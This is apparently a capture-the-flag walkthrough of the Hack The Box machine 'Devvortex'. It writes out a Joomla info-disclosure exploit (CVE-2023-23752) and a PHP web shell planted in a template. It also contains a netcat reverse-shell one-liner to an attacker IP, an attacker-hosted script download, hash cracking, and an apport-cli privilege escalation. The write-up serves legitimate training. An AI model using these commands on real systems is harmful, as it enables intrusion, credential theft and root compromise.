# Devvortex - Easy

```sh
sudo vim /etc/hosts
# map IP to devvortex.htb

nmap -T4 -p- -A -Pn -v devvortex.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
    * 80/tcp - http - nginx 1.18.0

* the webpage is titled 'DevVortex', and it is a normal corporate website

* web enumeration:

    ```sh
    gobuster dir -u http://devvortex.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -t 10
    # directory scan

    ffuf -c -u "http://devvortex.htb" -H "Host: FUZZ.devvortex.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 154 -s
    # subdomain scan
    ```

* the subdomain scan gives us a subdomain 'dev.devvortex.htb' - add this to ```/etc/hosts```

* checking this subdomain, this also seems to be a corporate webpage

* directory scan for this subdomain:

    ```sh
    gobuster dir -u http://dev.devvortex.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html -t 10
    ```

* the directory scan on this subdomain gives us a few interesting pages - /administrator page stands out

* navigating to /administrator leads to a login page for Joomla CMS

* the page itself does not reveal its version, and attempting to login via default or weak creds like 'admin:admin' or 'admin:joomla' does not work

* checking for /README.txt shows the Joomla version is 4.2

* another way to check version for Joomla is to navigate to '/administrator/manifests/files/joomla.xml' - this shows that the current version is 4.2.6

* the XML file also confirms admin user is 'admin'

* searching for exploits related to this version gives us [CVE-2023-23752](https://www.vulncheck.com/blog/joomla-for-rce) - an info disclosure vuln

* we can use these requests to check for any sensitive info disclosure:

    ```sh
    curl 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true'
    # we can prettify this output

    curl 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true' | jq
    # config info

    curl 'http://dev.devvortex.htb/api/index.php/v1/users?public=true' | jq
    # user info
    ```

* from these endpoints, we are able to gather some info:

    * the webapp uses 'tinymce' editor
    * the dbtype is 'mysqli'
    * we get creds 'lewis:P4ntherg0t1n5r3c0n##'
    * 'lewis' is a super user (admin) on Joomla
    * 'logan' is another user on Joomla
    * we also get the emails 'lewis@devvortex.htb' & 'logan@devvortex.htb'

* we can try to log into SSH as 'lewis' using this password but that does not work

* so we need to get RCE via Joomla CMS

* after logging into Joomla as 'lewis', we can follow [this guide on modifying templates to get RCE](https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/joomla):

    * navigate to System > Templates > Site Templates
    * click on an available template to bring up the template customization editor
    * we can edit an existing page like 'error.php' and add a PHP one-liner for RCE - ```system($_GET['cmd']);``` - add it within the main body
    * then click on 'save', but do not close the editor view

* after the template changes, we can check if we have RCE:

    ```sh
    curl 'http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=id'
    # this works

    nc -nvlp 4444
    # setup listener

    # use reverse-shell URL-encoded one-liner
    curl 'http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.21%204444%20%3E%2Ftmp%2Ff'
    # this works
    ```

* in reverse shell:

    ```sh
    # stabilise shell first

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # press Enter twice

    ls -la /var/www
    # enumerate the web folders for any secrets

    cat /var/www/dev.devvortex.htb/configuration.php

    ls -la /home
    # we have user 'logan'

    ls -la /home/logan
    ```

* from the 'configuration.php' file, we get the DB secret 'ZI7zLTbaGKliS9gq' in addition to 'lewis' user's password

* we can attempt to login as 'logan' by re-using the password and secret values, but that does not work

* we can attempt basic enumeration using ```linpeas.sh```:

    ```sh
    # fetch script from attacker
    cd /tmp

    wget http://10.10.14.21:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * box is running Linux version 5.4.0-167-generic, Ubuntu 20.04.6
    * sudo version 1.8.31
    * ```mysql``` is running on box, as seen from processes as well as open port tcp/3306

* we can attempt to log into ```mysql``` as we have multiple usernames and 2 possible passwords:

    ```sh
    mysql -u root -p
    # this does not work

    mysql -u logan -p
    # this does not work

    mysql -u lewis -p
    # this works with the same password as Joomla
    ```

    ```sql
    show databases;

    use joomla;

    show tables;

    select * from sd4fg_users;
    # checking the 'users' table, we get hashes for 'lewis' and 'logan'
    ```

* as we have the password for 'lewis' already, we just need to crack the hash for 'logan'

* online hash identifier tools show that it is in the 'bcrypt $2*$, Blowfish (Unix)' format, supported by mode 3200 in ```hashcat```:

    ```sh
    vim loganhash
    # paste hash

    hashcat -m 3200 loganhash /usr/share/wordlists/rockyou.txt --force
    # cracks it
    ```

* we get the cracked password 'tequieromucho' for 'logan' - we can log into SSH now:

    ```sh
    ssh logan@devvortex.htb

    cat user.txt
    # user flag

    sudo -l
    ```

* ```sudo -l``` shows that we can run ```/usr/bin/apport-cli``` as sudo:

    ```sh
    # check for related binaries

    ls -la /usr/bin

    ls -la /usr/bin/apport*
    # we have a few related programs
    ```

* Googling about this shows that ```apport-cli``` is the CLI tool for Apport crash reporting system, used in some distros

* Googling for exploits related to this leads to [CVE-2023-1326](https://github.com/diego-tella/CVE-2023-1326-PoC), a privesc exploit due to the pager view

* exploiting ```apport-cli```:

    ```sh
    ls -la /var/crash
    # the directory is empty, no crash logs
    # but we need a file to read

    # this directory is writable, so we can copy a valid crash file here

    # download a crash file example and fetch it to attacker
    wget http://10.10.14.21:8000/apport-crash-example.crash

    cp apport-crash-example.crash /var/crash/apport.crash

    ls -la /var/crash
    # we have our test file

    sudo /usr/bin/apport-cli -c /var/crash/apport.crash
    # now press V to view report
    # this brings the 'less' pager

    !/bin/sh
    # we get root shell

    cat /root/root.txt
    # root flag
    ```
